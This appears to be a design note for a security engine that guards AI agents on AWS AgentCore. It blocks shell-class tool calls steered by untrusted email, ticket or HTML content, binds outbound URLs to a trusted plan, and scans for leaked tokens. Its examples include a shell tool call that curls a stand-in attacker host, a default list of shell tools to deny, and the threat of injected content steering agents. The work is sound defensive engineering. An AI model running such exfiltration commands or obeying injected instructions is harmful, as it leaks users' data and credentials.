# AWS AgentCore heap-view — shell-class ActionGuard (thin land)

Closes the Unit 42 / CSA AgentCore harness residual that is **engine-composable**:
default shell-class tools co-steered by untrusted ticket/HTML, plus webhook
destinations outside TrustedPlan, plus opt-in `dataProtection` hygiene for
vault/Bearer sessions.

**Not** an AWS runtime patch. **Not** deepset 80%. Escalate **BLOCK**.

KPI = shell-class act gate + destination bind + DP session hygiene + CPE compose.

## A — ActionGuard shell-class policy

Configurable shell class (default: `shell`, `bash`, `sh`, `code_interpreter`,
`run_terminal`, `terminal`, `file_operations`) → **DENY/escalate** when
`SourceTrust` is untrusted (or ActionGuard `source` ∈ untrusted ingress) **even
if the tool name is on TrustedPlan**. Shell omitted from plan → DENY (existing
AG). Explicit **user / HITL** (`SourceTrust=user|hitl|…` or `hitlConfirm`) →
**ALLOW** when on plan.

```typescript
import { actionGuard, denyShellClassPolicy, DEFAULT_SHELL_CLASS_TOOLS } from '@sovguard/engine';

const decision = actionGuard(
  { tools: ['shell', 'summarize'] },
  [{ type: 'tool', name: 'shell', args: { cmd: 'whoami' } }],
  { source: 'email', SourceTrust: 'email' }, // → DENY shell_class_policy
);

// User authorize
actionGuard(plan, proposed, { SourceTrust: 'user' }); // ALLOW if on plan
actionGuard(plan, proposed, { source: 'email', hitlConfirm: true }); // ALLOW
```

## B — KPI-C destination bind

For shell-class / `fetch` / `http_post` / POST-like tools, destination URL args
(and URLs embedded in `cmd`/`command`/`script`) must be ⊆ `TrustedPlan.urls`
**or** the matching `argAllowlist` entry. **Open plan is insufficient** for
unexpected webhooks.

```typescript
actionGuard(
  { tools: ['shell'], urls: ['https://api.example.com/'] },
  [{ type: 'tool', name: 'shell', args: { cmd: 'curl https://attacker.evil.test/w' } }],
  { SourceTrust: 'user' },
); // → DENY shell_destination_bind
```

## C — dataProtection session hygiene

Global default remains **OFF**. For Identity / vault / MCP Bearer agents,
hosts should **session-gate** `dataProtection=true` so JWT/AKIA on the agent
**text** path hit `secret_leak`:

```typescript
import { sessionGateDataProtection, scanOutput } from '@sovguard/engine';

const gate = sessionGateDataProtection({ hasVault: true, hasBearerAuth: true });
const out = scanOutput(agentText, { jobId, dataProtection: gate.dataProtection });
```

## D — CPE compose

Untrusted ticket/HTML cannot elevate Spotlight wrap role (`untrusted:${source}`).
Existing CPE role-attr guard — no-worsen under this land.

## Soft PARK (platform — document only, not this land)

- Non-root shell UID  
- Credential-resolve process isolation (`/proc` heap co-residency)  
- Short-lived vault JWT / ZSP  
- VPC / harness **OS egress** (shell-side HTTP POST outside agent text)

These are operator / AWS shared-responsibility. Engine does **not** claim
completeness against heap-view when shell is legitimately authorized.

## Non-goals

Live AgentCore PoC · deepset 80% · Loopjacking / PMPA / CFD / EP / MCP Discovery
re-land · AttackIndex / IOC.

## Fixtures

Prefer `threat-scout/pentest/payloads/aws-agentcore-heap-view.json` (PASS G1–G6
shapes + complementary). Tests: `test/aws-agentcore-heap-view.test.ts`.
